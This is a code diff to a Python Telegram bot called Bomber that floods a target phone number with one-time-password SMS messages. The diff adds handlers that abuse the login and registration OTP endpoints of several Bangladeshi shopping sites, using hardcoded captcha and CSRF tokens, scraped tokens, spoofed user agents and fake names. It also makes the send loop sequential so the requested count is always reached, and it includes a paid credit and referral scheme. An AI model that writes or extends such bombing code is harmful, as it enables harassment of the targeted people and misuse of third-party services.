@@ -138,23 +138,147 @@ class Bomber:
       pass
     return False
 
+  def shopz(self):
+    url = "https://www.shopz.com.bd/api/v1/auth/send-otp"
+    headers = {
+        "accept": "*/*",
+        "content-type": "application/json",
+        "origin": "https://www.shopz.com.bd",
+        "referer": "https://www.shopz.com.bd/login",
+        "user-agent": self.getUserAgent(),
+        "x-requested-with": "mark.via.gp",
+    }
+    phone_num = self.user_mobile
+    if not phone_num.startswith("+88"):
+      if phone_num.startswith("88"):
+        phone_num = "+" + phone_num
+      else:
+        phone_num = "+88" + phone_num
 
+    payload = {
+        "phone": phone_num,
+        "purpose": "login",
+        "captchaToken": (
+            "1.kJ9waKkYlBujOwexbvOl63WZrg2sBM5vKdna9SAuTgT_7kB69GgdBbs-jvo-B49IY8qDBfILwN11cm_udwSoDVLts9qlfC0djA0T8duFpShaSNqONsoZSPm18dbTmD367tBY_LTU2Hjv1IVo_hIcRVkyhcS2pHt02jy6a9CIdFkCgVUL082k8c81zSzhRyhDhs0XRluYHMDdRXxDkpmWe5uS7Wr7S5oal3SY1nJ-Q3eI9qIP9I2gVYDTFLdzfdcAz2rqAfcMLw9PteBqXZnGxKIDl7vv30IjjSCZSGWMCsthVGlNkJVn5w2MHwTEo1f0XKV0JYhdzsyqB3tGgIpuvIw5VCeWFSjol_GLg5FXZPf0_g5Zxc5JhiRlKTc5tqvlGhCOA4DaYnYRZoKOa7I7zXcU85nb8YqtYDgoo4FLfSD-XjoYhFIuxSSANRmucUR7WnGJrAcuPdgsMHYZJDG4reRhoQexWC_RyMPQuVAYgp5xK62pN5J87xHx49koZGbUd2IhE73RjucZbcn1MzoS19tWocmky0sJNzLivVkpvfby8b-mepIGNNopfVtLRyScjemlZjcDY8PLX7TOum97Ar3CuZPCg4jYyXl3AVWak5OFYA98Hy99NQZmUgy8c5hB2gO-u05m9fjbmaJQtnLITqbQLm5fYkkMwuOenIenyJ_EV59WG2sQ5vP7o4MUJUnlA63iUXhHeneYObrv53oTmqrAlQ7jrtsq2ZtP0y36Gqo.WrDo0A20eZBpeygKDN7UIg.fa47062f3ec85ee87e62027d0026a4b32addfaeb1d854642ce2aae530bc8d564"
+        ),
+    }
+    try:
+      r = requests.post(url, json=payload, headers=headers, timeout=5)
+      if r.status_code == 200:
+        return True
+    except:
+      pass
+    return False
 
-  
-  
+  def ghorerbazar(self):
+    url = "https://ghorerbazar.com/submit/otp"
+    headers = {
+        "Host": "ghorerbazar.com",
+        "User-Agent": self.getUserAgent(),
+        "Accept": (
+            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
+        ),
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "https://ghorerbazar.com",
+        "Referer": "https://ghorerbazar.com/varify/otp",
+        "X-Requested-With": "mark.via.gp",
+    }
+    payload = {
+        "_token": "0ecCDCSnO9CedtuzdjGG55EO8dw8RtHN68H2YbE0",
+        "phone": self.user_mobile,
+        "name": "Oustad User",
+        "otp": "",
+    }
+    try:
+      r = requests.post(url, data=payload, headers=headers, timeout=5)
+      if r.status_code in [200, 301, 302]:
+        return True
+    except:
+      pass
+    return False
 
-  
+  def shopbasebd(self):
+    url = "https://shopbasebd.com/store/registration/sendOTP"
+    session = requests.Session()
+    headers = {
+        "Host": "shopbasebd.com",
+        "User-Agent": self.getUserAgent(),
+        "Accept": "*/*",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Origin": "https://shopbasebd.com",
+        "Referer": "https://shopbasebd.com/store/registration",
+        "X-Requested-With": "XMLHttpRequest",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+    }
+    try:
+      get_res = session.get(
+          "https://shopbasebd.com/store/registration",
+          headers=headers,
+          timeout=5,
+      )
+      if get_res.status_code == 200:
+        html_content = get_res.text
+        token = ""
+        if 'name="_token" value="' in html_content:
+          token = (
+              html_content.split('name="_token" value="')[1]
+              .split('"')[0]
+              .strip()
+          )
+        if token:
+          payload = {"number": self.user_mobile, "_token": token}
+          r = session.post(url, data=payload, headers=headers, timeout=5)
+          if r.status_code == 200:
+            return True
+    except:
+      pass
+    return False
 
+  def rkpl_estore(self):
+    url = "https://estore.rkpl.com.bd/register"
+    headers = {
+        "Host": "estore.rkpl.com.bd",
+        "User-Agent": self.getUserAgent(),
+        "Accept": "text/x-component",
+        "Content-Type": "text/plain;charset=UTF-8",
+        "Origin": "https://estore.rkpl.com.bd",
+        "Referer": "https://estore.rkpl.com.bd/register",
+        "Next-Action": "7f1acd7fd062bc1c3a8e5e8fbda9afe7b8302cdaa2",
+        "X-Requested-With": "mark.via.gp",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+    }
+    payload = f'[{{"phone":"{self.user_mobile}"}}]'
+    try:
+      r = requests.post(url, data=payload, headers=headers, timeout=5)
+      if r.status_code == 200 and "OTP successfully sent" in r.text:
+        return True
+    except:
+      pass
+    return False
 
-
-
-
-
-
-
-
-
-
+  def darun_bd(self):
+    url = "https://darun.com.bd/register?next=%2F"
+    headers = {
+        "Host": "darun.com.bd",
+        "User-Agent": self.getUserAgent(),
+        "Accept": "text/x-component",
+        "Content-Type": "text/plain;charset=UTF-8",
+        "Origin": "https://darun.com.bd",
+        "Referer": "https://darun.com.bd/register?next=%2F",
+        "Next-Action": "402dce7ca6db2006145ef9dc026f141dc180ce851e",
+        "X-Requested-With": "mark.via.gp",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+    }
+    name_list = ["Fosla", "Oustad", "Ruhin", "Hero", "Admin", "User"]
+    rand_name = random.choice(name_list)
+    payload = f'[{{"name":"{rand_name}","phone":"{self.user_mobile}","email":""}}]'
+    try:
+      r = requests.post(url, data=payload, headers=headers, timeout=5)
+      if r.status_code == 200:
+        return True
+    except:
+      pass
+    return False
 
   def start(self):
     current_credits = user_credits.get(self.chat_id, 0)
@@ -168,57 +292,59 @@ class Bomber:
       )
       return
 
-    # ১ ক্রেডিট কাটা হচ্ছে এবং হিট কাউন্ট ১ বাড়নো হচ্ছে
+    # ১ ক্রেডিট কাটা হচ্ছে এবং হিট কাউন্ট ১ বাড়ানো হচ্ছে
     user_credits[self.chat_id] -= 1
     if self.chat_id in user_hits:
       user_hits[self.chat_id] += 1
     else:
       user_hits[self.chat_id] = 1
 
-    counter = 0
     bot.send_message(
         self.chat_id,
-        f"🚀 **Target:** `{self.user_mobile}`\n📊 **Count:**"
-        f" `{self.number_of_messege}`\n⚡ **বম্বিং কার্যক্রম শুরু হয়েছে...**\n💳"
+        f"🚀 **Target:** `{self.user_mobile}`\n📊 **Target Count:**"
+        f" `{self.number_of_messege}`\n⚡ **সিরিয়াল অনুযায়ী বম্বিং শুরু হয়েছে...**\n💳"
         f" কেটে নেওয়া হয়েছে: `1` ক্রেডিট (বাকি: `{user_credits[self.chat_id]}`"
         " ক্রেডিট)",
         parse_mode="Markdown",
     )
+
+    # সিরিয়াল লিস্ট (যে অর্ডারে সাজানো, ঠিক সেই সিরিয়ালে একে একে হিট করবে)
     methods = [
         self.aroggo,
         self.grameenphone,
         self.bdtickets,
-        
-        
-        
-        
-        
+        self.shopz,
+        self.ghorerbazar,
+        self.shopbasebd,
+        self.rkpl_estore,
+        self.darun_bd,
     ]
 
-    while counter < self.number_of_messege:
-      current_methods = list(methods)
-      random.shuffle(current_methods)
+    counter = 0
+    method_index = 0
 
-      for method in current_methods:
-        if counter >= self.number_of_messege:
-          break
-        try:
-          success = method()
-          if success:
-            counter += 1
-            bot.send_message(
-                self.chat_id,
-                f"[+] OTP sent successfully! [{counter}/{self.number_of_messege}]",
-            )
-            time.sleep(2.5)
-          else:
-            time.sleep(1)
-        except:
-          time.sleep(1)
+    # যতক্ষণ না ইউজারের দেওয়া কাঙ্ক্ষিত টার্গেট কাউন্ট পুরোপুরি পূরণ হয়, লুপ চলতে থাকবে
+    while counter < self.number_of_messege:
+      current_method = methods[method_index]
+      method_index = (method_index + 1) % len(methods)
+
+      try:
+        success = current_method()
+        if success:
+          counter += 1
+          bot.send_message(
+              self.chat_id,
+              f"[+] OTP sent successfully! [{counter}/{self.number_of_messege}]",
+          )
+          time.sleep(2.0)
+        else:
+          time.sleep(0.5)
+      except:
+        time.sleep(0.5)
 
     bot.send_message(
         self.chat_id,
-        f"✅ **টাস্ক সম্পন্ন!**\nTarget: `{self.user_mobile}` সফলভাবে শেষ হয়েছে।",
+        f"✅ **টাস্ক সম্পন্ন!**\nTarget: `{self.user_mobile}` এর জন্য নির্ধারিত `{self.number_of_messege}` টি মেসেজ সফলভাবে পাঠানো হয়েছে।",
         parse_mode="Markdown",
     )
 
@@ -328,18 +454,16 @@ def send_welcome(message):
   chat_id = message.chat.id
   args = message.text.split()
 
-  # নতুন ইউজার হলে সাইন-আপ বোনাস ২ ক্রেডিট দেওয়া
   if chat_id not in user_credits:
     user_credits[chat_id] = 2  # নতুনদের জন্য ২ ক্রেডিট ফ্রি
     if chat_id not in user_hits:
       user_hits[chat_id] = 0
 
-    # রেফারেল চেক (যদি কেউ রেফার লিংক থেকে জয়েন করে)
     if len(args) > 1:
       try:
         referrer_id = int(args[1])
         if referrer_id != chat_id and referrer_id in user_credits:
-          user_credits[referrer_id] += 1  # রেফারাকে ১ ক্রেডিট বোনাস
+          user_credits[referrer_id] += 1
           bot.send_message(
               referrer_id,
               "🎉 **অভিনন্দন!** আপনার রেফারেল লিংকের মাধ্যমে একজন নতুন ইউজার"
@@ -387,7 +511,8 @@ def handle_text_buttons(message):
             f"🟢 **Bot Status:** Online & Active\n💳 **Your Credits:**"
             f" `{current_bal}` টি\n⚡ **Your Total Hits:** `{hits}` বার\n🚀"
             " **APIs Loaded:** Arogga, Grameenphone, Bdtickets, Shopz,"
-            " Ghorerbazar\n⚡ **Speed:** High Performance"
+            " Ghorerbazar, Shopbasebd, RKPL Estore, Darun BD\n⚡ **Mode:**"
+            " Sequential (Serial)"
         ),
         reply_markup=get_reply_keyboard(),
         parse_mode="Markdown",
@@ -399,8 +524,9 @@ def handle_text_buttons(message):
         (
             "ℹ️ **কীভাবে ব্যবহার করবেন:**\n\n১. `🚀 Start Bombing` বাটনে ক্লিক"
             " করুন।\n২. টার্গেট নম্বর দিন।\n৩. কতটি মেসেজ পাঠাবেন তা লিখুন (প্রতিবার"
-            " বম্বিংয়ে মাত্র **১ ক্রেডিট** কাটা হবে)।\n\n🎁 ফ্রি ক্রেডিট পেতে"
-            " `/refer` কমান্ড দিয়ে আপনার বন্ধুদের মাঝে লিংক শেয়ার করুন!"
+            " বম্বিংয়ে মাত্র **১ ক্রেডিট** কাটা হবে এবং সঠিক কাউন্ট পূরণ"
+            " হবে)।\n\n🎁 ফ্রি ক্রেডিট পেতে `/refer` কমান্ড দিয়ে আপনার বন্ধুদের"
+            " মাঝে লিংক শেয়ার করুন!"
         ),
         reply_markup=get_reply_keyboard(),
         parse_mode="Markdown",
@@ -410,8 +536,8 @@ def handle_text_buttons(message):
     bot.send_message(
         chat_id,
         (
-            "👑 **Developer:**WQ OWNER (ওস্তাদ)\n⚡ **Brand:** GRAPIXY HUB\n🌐"
-            " **Hosted on:** None"
+            "👑 **Developer:** WQ OWNER (ওস্তাদ)\n⚡ **Brand:** GRAPIXY HUB\n🌐"
+            " **Status:** Pro Active"
         ),
         reply_markup=get_reply_keyboard(),
         parse_mode="Markdown",
